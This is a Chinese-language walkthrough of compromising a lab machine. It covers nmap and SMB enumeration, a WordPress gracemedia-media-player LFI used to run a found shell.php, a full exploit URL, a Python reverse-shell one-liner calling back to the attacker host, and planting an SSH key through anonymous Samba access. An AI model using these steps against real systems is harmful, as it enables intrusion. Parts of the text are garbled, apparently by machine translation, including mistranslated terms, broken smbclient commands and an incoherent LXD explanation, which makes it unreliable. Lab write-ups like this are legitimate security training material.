## **信息收集**  

首先使用arp-scan扫描资产：

```
arp-scan --interface=eth0 192.168.226.0/24
```

![](../Images/0c3cc36b49c38e830039c462310f0092.png)

  

发现目标主机192.168.226.133，使用nmap做进一步端口扫描：

```
nmap -sC -sV -p- -sT 192.168.226.133
```

![](../Images/a09b3c9fbfd4da8f22687db75bec1649.png)

  

如上图所示，开启的服务很少，除了 22 和 80 外，还开启了 139、445 和 10123。其中 139 和 445 上运行的是 Samba 服务，说明目标机可能是一个 SMB 服务器。10123 口上是一个Python搭建的HTTP服务。

  

> SMB（服务器消息块）是一种协议，它允许同一网络上的资源共享文件，浏览网络并通过网络打印进行。它最初用于 Windows，但 Unix 系统可以通过 Samba 使用 SMB。今天，我们将使用名为Enum4linux的工具从目标中提取信息，并使用smbclient连接到SMB共享并传输文件。
> 
> 通常，服务器上有 SMB 共享驱动器，可以连接到该驱动器并用于查看或传输文件。在极端情况下，例如当SMB共享目录和Web服务器根目录相同时，攻击者甚至可能利用这种错误配置来实现代码执行。

首先访问80口的Web服务：

  

![](../Images/2391db7373709d033eab5c5cb33c0b2b.png)

  

再看10123口上的服务如下图可以看到这里存在一个文件遍历可以下载文件：

  

![](../Images/cf520530a0ba90d0587d3a3162902b4e.png)

  

我们使用 wget 将 10123 口上的文件全部还原下载下来：

```
wget -r http://192.168.226.133:10123
```

![](../Images/c2fc5b1ca97db80395f0991ed96e3426.png)

  

然后挨个查看，如下图所示，在上传目录里面发现了一个shell.php：

  

![](../Images/efbd64e6ae69540552b9cccf209bcab8.png)

  

由于10123端口上是Python启动的HTTP服务，shell.php无法被解析，所以如果我们要利用的话还需要从80口进行利用。

  

## **开始攻击**

首先我们来对80口上的Web服务进行目录扫描：

  

![](../Images/d8e4f8a8b9fa3ffa02728a00f18d45eb.png)

  

发现wp目录，访问wp不出所料是一个wordpress：

  

![](../Images/c259b24ee61160880781db213fe4d0a5.png)

  

一看到wordpress就考虑先用wpscan扫一波，来看看有什么插件漏洞：

```
wpscan --url http://192.168.226.133/wp/ --enumerate ap --api-token AC24aGaxxxxxxxxxxxxxxxxxxxxxxxxxxEJJTk9jGrQ
```

![](../Images/f1d0eacb20083b83718ad5500c7fc8f4.png)

  

如上图所示发现目标的gracemedia-media-player插件上存在一个本地文件包含漏洞根据下面给出的参考信息我们可以在db上找到该漏洞的利用方式：

  

![](../Images/7d3114c64d64a25e3d52d8d9bd034a63.png)

  

如下图所示成功利用：

  

![](../Images/d69298c6d17b914af3648dc3537d9b85.png)

  

并且发现目标主机上存在一个 jarves 用户，其主目录为 /home/jarves。

现在我们便可以通过这里的本地文件存在漏洞去利用之前找到的 shell.php 了。但是现在还需要解决一个问题，就是 shell.php 的路径问题。

我们再想一下之前做的信息收集，当时还发现目标上 139 和 445 端口上运行着 Samba 服务，需要让我觉得 10123 端口与这里的 Samba 服务有关。

我们使用 Enum4linux 工具对目标主机上的 SMB 信息进行枚举：

```
enum4linux -A 192.168.226.133
```

![](../Images/f39390107165169dbf96cce23378e866.png)

  

如上图所示，目标机的 Samba 服务运行使用空密码进行访问，并且开启着三个共享：

  

![](../Images/9f682edfdf444e2637a97ab3e6ef65d7.png)

  

现在，我们已经使用 Enum4linux 收集了有关目标的一些信息，我们可以使用 Smbclient 工具来与系统上的 SMB 进行交互交互。

  

> Smbclient 是一种用于访问服务器上 SMB 的工具，就像 FTP 客户端一样，用于访问文件一样。它提供了一个简单的资源命令行界面，如果您完全了解 FTP 的话，可以轻松使用。

```
smbclient //192.168.226.133/welcome -U '' -N
```

*   \-U：标志指定用户名（在匿名登录的情况下为空白字符串）
    
*   \-N：指定无密码
    

现在我们特别在注意力下面点击进入重点分类登录：

  

![](../Images/8308867b87c04a07bfa33879a4bacb09.png)

  

如上图所示，连上之前的当前目录，发现和之前的 10123 端口发现的目录结构是的，说明之前的 10123 口上的服务运行目录就是当前 Samba 服务的目录，现在应该是 jarves 用户的主经过测试，验证了我的目录：

```
/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax\_controller.php?ajaxAction=getIds&cfg=/home/jarves/upload/shell.php&cmd=id
```

![](../Images/f887b0b7d2fcd173f9f3327a282cb622.png)

  

如上图所示，成功执行命令。

然后尝试使用bash、nc反弹Shell皆失败，由于完全可以使用主机上存在蟒蛇，所以可以使用蟒蛇来反弹我们Shell：

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("192.168.226.128",2333));os.dup2(s.fileno() ,0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
```

![](../Images/e80b91b31315ec8368bd9b0717f174f4.png)

  

成功获得壳牌。

  

## **权限提升**

在根目录里面没有发现标志，那么标志一定是在 /root 目录里面，所以必然的我们要提权。

  

由于我们已经控制了目标的 Samba，我们完全在目标机用户 jarves 的主目录里面可以写入 SSH 秘钥密钥进行免密登录。

  

首先在攻击机本地生成SSH秘诀：

```
ssh-keygen -t rsa 
cp ~/.ssh/id\_rsa.pub ./authorized\_keys
```

然后再smbclient里面为jarves创建一个.ssh目录，就可以生成的authorized\_keys文件用户上传上传：

```
MKDIR的.ssh 
CD的.ssh
放的authorized\_keys
```

![](../Images/7eae25b1c9e051a779682eef9e777170.png)

  

然后就可以直接连接jarves用户的SSH了：

  

![](../Images/ff0037c2fd9303876cad7104702b36c4.png)

  

首先尝试SUID提权，搜一波并没有什么可以利用的文件：

  

![](../Images/399c3a9984bae98caeda6275bc81c805.png)

  

然后尝试使用sudo 提权，却发现需要输入密码，无法利用：

> Linux Container（LXC）通常被认为是量级虚拟化技术，比较合适的Chroot和完整开发的虚拟机之间，LXC可以创建一个良好的Linux操作系统十近的环境，而不需要使用到一种较轻的Linux Daemon（LXD）是一个轻量级容器管理程序，而LXD是基于LXC容器技术实现的，而这种技术之前的Docker也使用过。LXD使用了稳定的LXC API来完成所有的后台容器管理工作，并且增加了 REST API 支持，更进一步地提升了用户体验度。
> 
> LXD 是根进程，它可以主要执行任意用户很多的 LXD UNIX 主要用于访问操作。而且在某些情况下，LXD 也不会对调用它的用户权限进行检查和匹配，现在社区也有种方法可以利用 LXD 的这种特性来实施攻击。
> 
> 成功的，攻击者可以将低权限的用户提升为Root权限，并且能够在不受任何限制的情况下访问目标系统的各种数据资源，避免Docker特权模式逃逸。
